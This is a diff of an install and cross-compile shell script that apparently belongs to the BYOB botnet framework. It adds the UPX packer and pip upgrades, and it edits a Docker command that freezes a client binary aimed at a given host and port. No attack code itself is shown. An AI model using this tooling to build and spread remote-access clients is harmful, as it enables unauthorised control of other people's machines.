@@ -116,7 +116,7 @@ prechecks() {
 }
 
 base_setup() {
-    base_pkg="git build-essential python python-pip python-virtualenv zlib1g-dev python3 python3-pip python3-wheel python3-setuptools python3-dev python3-distutils python3-venv"
+    base_pkg="git upx-ucl build-essential python python-pip python-virtualenv zlib1g-dev python3 python3-pip python3-wheel python3-setuptools python3-dev python3-distutils python3-venv"
     echo "===========================" > $outfile
     echo "STARTING INSTALL AT $(date)" >> $outfile
     feedback 0 "Updating system packages"
@@ -142,8 +142,12 @@ venv_setup() {
     fortheimpatient $! "initializing"
     feedback 1337 "Virtual environment initialized"
     source pyvenv/bin/activate
+    feedback 0 "Starting pip;setuptools upgrade"
+    python -m pip install --upgrade pip setuptools 2> $outfile >> $outfile &
+    fortheimpatient $! "pip;setuptools upgrading"
+    feedback 1337 "Python pip;setuptools upgraded"
     python -m pip install -r ../requirements.txt 2> $outfile >> $outfile &
-    fortheimpatient $! "Updating venv packages"
+    fortheimpatient $! "installing venv packages"
     deactivate
     feedback 1337 "Virtual environment packages updated"
     # some things break on other architectures
@@ -203,7 +207,7 @@ FROM $xc_dockimg
 COPY $str_binfmt $map_binfmt
 CMD ls ./ /usr/bin
 RUN /usr/bin/apt-get update
-RUN /usr/bin/apt-get install -y build-essential python python-pip zlib1g-dev python3 python3-pip python3-wheel python3-setuptools python3-dev python3-distutils python3-venv
+RUN /usr/bin/apt-get install -y upx-ucl build-essential python python-pip zlib1g-dev python3 python3-pip python3-wheel python3-setuptools python3-dev python3-distutils python3-venv
 RUN mkdir /byob
 WORKDIR /byob
 EOF
@@ -229,7 +233,7 @@ si_host="\$1"
 si_port="\$2"
 bin_target="\$3"
 if [ "\$bin_target" == "" ]; then bin_target=\$(date +%s); fi
-docker run -it --rm -v $project:/byob $xc_dockimg:BYOB /bin/bash -c "cd /byob; if [ -d crosscomp/pyvenv-$xc_arch_str ] ; then rm -Rf crosscomp/pyvenv-$xc_arch_str; fi; if [ -d modules/payloads ] ; then rm -Rf modules/payloads; fi; if [ -d modules/stagers ] ; then rm -Rf modules/stagers; fi; echo $nixreqs | base64 -d > crosscomp/requirements_b.txt; python3 -m venv crosscomp/pyvenv-$xc_arch_str; source crosscomp/pyvenv-$xc_arch_str/bin/activate; pip install wheel; pip install -r crosscomp/requirements_b.txt; python client.py --freeze --name \${bin_target}.${xc_arch} \$si_host \$si_port; rm -f ./\${bin_target}*; deactivate;"
+docker run -it --rm -v $project:/byob $xc_dockimg:BYOB /bin/bash -c "cd /byob; if [ -d crosscomp/pyvenv-$xc_arch_str ] ; then rm -Rf crosscomp/pyvenv-$xc_arch_str; fi; if [ -d modules/payloads ] ; then rm -Rf modules/payloads; fi; if [ -d modules/stagers ] ; then rm -Rf modules/stagers; fi; echo $nixreqs | base64 -d > crosscomp/requirements_b.txt; python3 -m venv crosscomp/pyvenv-$xc_arch_str; source crosscomp/pyvenv-$xc_arch_str/bin/activate; python -m pip install --upgrade pip setuptools; pip install wheel; pip install -r crosscomp/requirements_b.txt; python client.py --freeze --name \${bin_target}.${xc_arch} \$si_host \$si_port; rm -f ./\${bin_target}*; deactivate;"
 EOF
         chmod u+x "compile_$xc_arch_str.sh"
         fi
